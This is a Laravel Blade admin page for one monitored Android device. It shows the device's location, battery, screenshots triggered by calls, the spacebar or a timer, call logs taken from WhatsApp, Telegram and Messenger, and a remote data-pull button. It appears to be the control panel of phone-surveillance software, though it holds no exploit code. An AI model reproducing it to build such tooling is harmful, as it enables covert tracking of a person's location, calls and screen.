@extends('admin.layouts.app')
@section('title', $device->device_name)
@section('page-title', $device->device_name)

@section('content')
    <!-- Device Info Bar -->
    <div class="stats-grid animate-in">
        <div class="stat-card">
            <div class="stat-icon blue"><i class="fas fa-mobile-screen"></i></div>
            <div class="stat-value" style="font-size:18px;">{{ $device->model }}</div>
            <div class="stat-label">Android {{ $device->android_version }}</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon green"><i class="fas fa-battery-three-quarters"></i></div>
            <div class="stat-value">{{ $device->battery_level ?? '—' }}%</div>
            <div class="stat-label">Battery Level</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon purple"><i class="fas fa-location-dot"></i></div>
            <div class="stat-value" style="font-size:14px;">
                @if($device->last_lat)
                    {{ $device->last_lat }}, {{ $device->last_lng }}
                @else
                    No location
                @endif
            </div>
            <div class="stat-label">Last Known Location</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon orange"><i class="fas fa-clock"></i></div>
            <div class="stat-value" style="font-size:14px;">
                {{ $device->last_seen_at ? $device->last_seen_at->diffForHumans() : 'Never' }}
            </div>
            <div class="stat-label">Last Seen</div>
        </div>
    </div>

    <!-- Actions Bar -->
    <div style="display:flex;gap:12px;margin-bottom:28px;" class="animate-in" style="animation-delay:0.1s">
        <button class="btn btn-primary" onclick="pullRealtime({{ $device->id }})">
            <i class="fas fa-download"></i> Pull Realtime Data
        </button>
        <button class="btn btn-outline" onclick="toggleDevice({{ $device->id }})">
            <i class="fas fa-power-off"></i> {{ $device->is_active ? 'Deactivate' : 'Activate' }}
        </button>
        <a href="{{ route('admin.dashboard') }}" class="btn btn-outline">
            <i class="fas fa-arrow-left"></i> Back
        </a>
    </div>

    <!-- Tabs -->
    <div class="tabs">
        <button class="tab active" onclick="switchTab('screenshots', this)">
            <i class="fas fa-camera" style="margin-right:6px;"></i> Screenshots ({{ $screenshots->total() }})
        </button>
        <button class="tab" onclick="switchTab('calls', this)">
            <i class="fas fa-phone" style="margin-right:6px;"></i> Call Logs ({{ $callLogs->total() }})
        </button>
        <button class="tab" onclick="switchTab('activity', this)">
            <i class="fas fa-list-timeline" style="margin-right:6px;"></i> Activity
        </button>
    </div>

    <!-- Screenshots Tab -->
    <div id="tab-screenshots" class="tab-content">
        @if($screenshots->count() > 0)
        <div class="screenshot-grid">
            @foreach($screenshots as $screenshot)
            <div class="screenshot-card" onclick="openScreenshot('{{ route('admin.screenshot.serve', $screenshot) }}')">
                <img src="{{ route('admin.screenshot.serve', $screenshot) }}" alt="Screenshot" loading="lazy">
                <div class="meta">
                    <div class="trigger trigger-{{ $screenshot->trigger_type }}">
                        <i class="fas fa-{{ $screenshot->trigger_type === 'spacebar' ? 'keyboard' : ($screenshot->trigger_type === 'call' ? 'phone' : ($screenshot->trigger_type === 'periodic' ? 'clock' : 'download')) }}"></i>
                        {{ str_replace('_', ' ', $screenshot->trigger_type) }}
                    </div>
                    <div class="time">{{ $screenshot->captured_at->format('M d, Y · h:i A') }}</div>
                    @if($screenshot->file_size)
                    <div class="time">{{ number_format($screenshot->file_size / 1024, 1) }} KB</div>
                    @endif
                </div>
            </div>
            @endforeach
        </div>
        <div style="margin-top:24px;">{{ $screenshots->links() }}</div>
        @else
        <div class="empty-state">
            <i class="fas fa-camera"></i>
            <p>No screenshots captured yet.</p>
        </div>
        @endif
    </div>

    <!-- Call Logs Tab -->
    <div id="tab-calls" class="tab-content" style="display:none;">
        @if($callLogs->count() > 0)
        <div class="data-table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th>Type</th>
                        <th>Source</th>
                        <th>Number / Contact</th>
                        <th>Duration</th>
                        <th>Date</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach($callLogs as $log)
                    <tr>
                        <td>
                            <span class="badge" style="
                                background: {{ $log->call_type === 'incoming' ? 'rgba(34,197,94,0.15)' : ($log->call_type === 'outgoing' ? 'rgba(59,130,246,0.15)' : 'rgba(239,68,68,0.15)') }};
                                color: {{ $log->call_type === 'incoming' ? '#22c55e' : ($log->call_type === 'outgoing' ? '#3b82f6' : '#ef4444') }};
                            ">
                                <i class="fas fa-{{ $log->call_type === 'incoming' ? 'phone-arrow-down-left' : ($log->call_type === 'outgoing' ? 'phone-arrow-up-right' : 'phone-xmark') }}"></i>
                                {{ ucfirst($log->call_type) }}
                            </span>
                        </td>
                        <td>
                            <span style="display:flex;align-items:center;gap:6px;">
                                @if($log->source === 'whatsapp')
                                    <i class="fab fa-whatsapp" style="color:#25d366;"></i>
                                @elseif($log->source === 'telegram')
                                    <i class="fab fa-telegram" style="color:#0088cc;"></i>
                                @elseif($log->source === 'messenger')
                                    <i class="fab fa-facebook-messenger" style="color:#006AFF;"></i>
                                @else
                                    <i class="fas fa-phone" style="color:#94a3b8;"></i>
                                @endif
                                {{ ucfirst($log->source) }}
                            </span>
                        </td>
                        <td>
                            <div>
                                <div style="font-weight:500;">{{ $log->contact_name ?? 'Unknown' }}</div>
                                <div style="font-size:12px;color:#64748b;">{{ $log->phone_number ?? '—' }}</div>
                            </div>
                        </td>
                        <td>
                            @if($log->duration)
                                {{ gmdate('H:i:s', $log->duration) }}
                            @else
                                —
                            @endif
                        </td>
                        <td>{{ $log->call_date->format('M d, Y · h:i A') }}</td>
                    </tr>
                    @endforeach
                </tbody>
            </table>
        </div>
        <div style="margin-top:24px;">{{ $callLogs->links() }}</div>
        @else
        <div class="empty-state">
            <i class="fas fa-phone"></i>
            <p>No call logs synced yet.</p>
        </div>
        @endif
    </div>

    <!-- Activity Tab -->
    <div id="tab-activity" class="tab-content" style="display:none;">
        @if($activityLogs->count() > 0)
        <div class="data-table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th>Event</th>
                        <th>Details</th>
                        <th>Time</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach($activityLogs as $log)
                    <tr>
                        <td>
                            <span class="badge" style="background:rgba(99,102,241,0.15);color:#818cf8;">
                                {{ str_replace('_', ' ', $log->event_type) }}
                            </span>
                        </td>
                        <td style="font-size:12px;color:#94a3b8;">
                            @if($log->metadata)
                                {{ json_encode($log->metadata) }}
                            @else
                                —
                            @endif
                        </td>
                        <td>{{ $log->event_at->format('M d, Y · h:i:s A') }}</td>
                    </tr>
                    @endforeach
                </tbody>
            </table>
        </div>
        @else
        <div class="empty-state">
            <i class="fas fa-list"></i>
            <p>No activity recorded yet.</p>
        </div>
        @endif
    </div>
@endsection

@section('scripts')
<script>
    function switchTab(tab, btn) {
        document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
        document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
        document.getElementById('tab-' + tab).style.display = 'block';
        btn.classList.add('active');
    }

    async function pullRealtime(deviceId) {
        showToast('Sending pull command...', 'info');
        const res = await apiPost(`/admin/devices/${deviceId}/pull-realtime`);
        if (res.success) {
            showToast(res.message, 'success');
        } else {
            showToast(res.message || 'Failed.', 'error');
        }
    }

    async function toggleDevice(deviceId) {
        const res = await apiPost(`/admin/devices/${deviceId}/toggle`);
        if (res.success) {
            showToast(res.message, 'success');
            setTimeout(() => location.reload(), 1000);
        }
    }
</script>
@endsection
